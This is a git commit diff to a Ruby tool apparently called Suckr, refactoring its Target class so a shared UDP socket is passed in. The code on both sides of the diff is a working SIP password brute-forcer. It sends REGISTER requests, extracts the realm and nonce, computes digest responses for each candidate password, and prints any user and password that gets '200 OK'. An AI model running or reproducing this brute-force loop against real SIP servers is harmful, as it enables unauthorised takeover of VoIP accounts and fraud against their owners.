4abca772d9a4eda74bf1d906714ea538871427aa
Dawid Pogorzelski <shogun999@gmail.com>
2013-02-03 00:50:11 +0100

    additional structure changes

--- lib/suckr/target.rb
+++ lib/suckr/target.rb
@@ -1,10 +1,11 @@
 module Suckr
     class Target
         attr_accessor :domain,:port,:uri
-        def initialize(domain,port)
+        def initialize(domain,port,socket)
             @domain = domain
             @port = port
             @uri = "sip:#{@domain}"
+            @socket = socket
         end
 
         def enumerate_users
@@ -12,51 +13,50 @@ module Suckr
         end
 
         def attack(range, pwd_range)
-            sock = UDPSocket.new
-
             for user in range
-              puts "brute forcing user #{user} on #{@domain} with password range #{pwd_range}"
-              start = Time.now
-              for pass in pwd_range
+                #TODO need to separate parsing responses to a separate structure
+                puts "brute forcing user #{user} on #{@domain} with password range #{pwd_range}"
+                start = Time.now
+                for pass in pwd_range
 
-                # send a registration message
-                sock.send(Suckr::Sip.send_register(@uri,@port,user,@domain),0,@domain,@port)
+                    # send a registration message
+                    @socket.send(Suckr::Sip.send_register(@uri,@port,user,@domain),0,@domain,@port)
 
-                # listen for response
-                reg_response=sock.recvfrom(1755)
+                    # listen for response
+                    reg_response=@socket.recvfrom(1755)
 
-                # get the Authorization header and parse out the realm and nonce
-                realm=""
-                nonce=""
-                reg_response[0].split("\r\n").each do | header |
-                  if(header =~ /^WWW-Authenticate/)
-                    if(header =~ /realm="([a-zA-Z0-9_\.]+)"/)
-                      realm=$1
+                    # get the Authorization header and parse out the realm and nonce
+                    realm=""
+                    nonce=""
+                    reg_response[0].split("\r\n").each do | header |
+                        if(header =~ /^WWW-Authenticate/)
+                            if(header =~ /realm="([a-zA-Z0-9_\.]+)"/)
+                                realm=$1
+                            end
+                            if(header =~ /nonce="([a-zA-Z0-9_\.]+)"/)
+                                nonce=$1
+                            end
+                        end
                     end
-                    if(header =~ /nonce="([a-zA-Z0-9_\.]+)"/)
-                      nonce=$1
+
+                    # generate the reponse
+                    if(realm!="" && nonce!="")
+                      response=Suckr::Response.create(user,realm,pass,@uri,nonce)
                     end
-                  end
-                end
 
-                # generate the reponse
-                if(realm!="" && nonce!="")
-                  response=Suckr::Response.create(user,realm,pass,@uri,nonce)
-                end
+                    # send the sip message
+                    @socket.send(Suckr::Sip.send_register_auth(@uri,@port,user,@domain,realm,nonce,response),0,@domain,@port)
 
-                # send the sip message
-                sock.send(Suckr::Sip.send_register_auth(@uri,@port,user,@domain,realm,nonce,response),0,@domain,@port)
-
-                # listen for response
-                auth_response=sock.recvfrom(1755)
-                if(auth_response[0] =~ /200 OK/)
-                   puts "#{user},#{pass},#{@domain}"
-                   # we have cracked a password - so we can break out of the inner loop
-                   elapsed = Time.now - start
-                   puts "<-- took #{elapsed} seconds to crack user #{user} -->"
-                   break
-                end
-              end 
+                    # listen for response
+                    auth_response=@socket.recvfrom(1755)
+                    if(auth_response[0] =~ /200 OK/)
+                       puts "#{user},#{pass},#{@domain}"
+                       # we have cracked a password - so we can break out of the inner loop
+                       elapsed = Time.now - start
+                       puts "<-- took #{elapsed} seconds to crack user #{user} -->"
+                       break
+                    end
+                end 
             end
 
         end
